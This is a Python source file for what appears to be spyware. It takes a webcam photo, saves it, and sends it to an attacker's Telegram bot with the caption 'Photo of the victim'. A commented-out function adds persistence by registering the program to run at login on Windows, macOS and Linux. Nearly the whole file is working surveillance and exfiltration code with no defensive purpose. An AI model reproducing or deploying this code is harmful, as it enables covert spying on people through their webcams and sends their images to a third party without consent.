import requests
import datetime
import cv2
from socket_project.use_functions.config import BOT_TOKEN, TELEGRAM_ID


def capture_image():
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        print("Не удалось открыть веб-камеру.")
        return None

    # Настройка параметров камеры
    cap.set(cv2.CAP_PROP_BRIGHTNESS, 0.5)
    cap.set(cv2.CAP_PROP_CONTRAST, 0.5)
    cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 0.75)

    ret, frame = cap.read()
    if ret:
        # Коррекция яркости и контрастности
        frame = cv2.convertScaleAbs(frame, alpha=1.5, beta=30)

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d___%H:%M:%S")
        filename = f'photos/image_{timestamp}.png'
        cv2.imwrite(filename, frame)
        cap.release()
        print(f"Фото сохранено как {filename}")
        return filename
    else:
        print("Не удалось захватить изображение.")
        cap.release()
        return None


def send_image_via_telegram(image_path):
    bot_token = BOT_TOKEN  # токен вашего бота
    chat_id = TELEGRAM_ID  # ваш чат ID
    url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'

    with open(image_path, 'rb') as image_file:
        files = [
            ('photo', image_file)
        ]

        data = [
            ('chat_id', chat_id),
            ('caption', 'Фото жертвы:')
        ]

        response = requests.post(url, files=files, data=data)

        if response.status_code == 200:
            print("Фото успешно отправлено через Telegram.")
            return True  # Возвращаем True при успешной отправке
        else:
            print(f"Не удалось отправить фото. Статус-код: {response.status_code}")
            return False  # Возвращаем False при неудаче

# def add_to_startup(file_path=None, key_name="CameraTelegramBot"):
#     if file_path is None:
#         file_path = os.path.abspath(sys.argv[0])
#
#     if platform.system() == "Windows":
#         startup_dir = winshell.startup()
#         shortcut_path = os.path.join(startup_dir, f"{key_name}.lnk")
#
#         if not os.path.exists(shortcut_path):
#             shell = Dispatch('WScript.Shell')
#             shortcut = shell.CreateShortCut(shortcut_path)
#             shortcut.Targetpath = sys.executable
#             shortcut.Arguments = f'"{file_path}"'
#             shortcut.WorkingDirectory = os.path.dirname(file_path)
#             shortcut.IconLocation = file_path
#             shortcut.save()
#
#     elif platform.system() == "Darwin":  # macOS
#         startup_dir = os.path.expanduser("~/Library/LaunchAgents")
#         plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
# <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
# <plist version="1.0">
# <dict>
#     <key>Label</key>
#     <string>{key_name}</string>
#     <key>ProgramArguments</key>
#     <array>
#         <string>{sys.executable}</string>
#         <string>{file_path}</string>
#     </array>
#     <key>RunAtLoad</key>
#     <true/>
# </dict>
# </plist>"""
#         plist_path = os.path.join(startup_dir, f"{key_name}.plist")
#         with open(plist_path, 'w') as plist_file:
#             plist_file.write(plist_content)
#
#     elif platform.system() == "Linux":
#         startup_dir = os.path.expanduser("~/.config/autostart")
#         desktop_entry_content = f"""[Desktop Entry]
# Type=Application
# Exec={sys.executable} "{file_path}"
# Hidden=false
# NoDisplay=false
# X-GNOME-Autostart-enabled=true
# Name={key_name}
# Comment=Start CameraTelegramBot on login"""
#
#         desktop_entry_path = os.path.join(startup_dir, f"{key_name}.desktop")
#         with open(desktop_entry_path, 'w') as desktop_file:
#             desktop_file.write(desktop_entry_content)
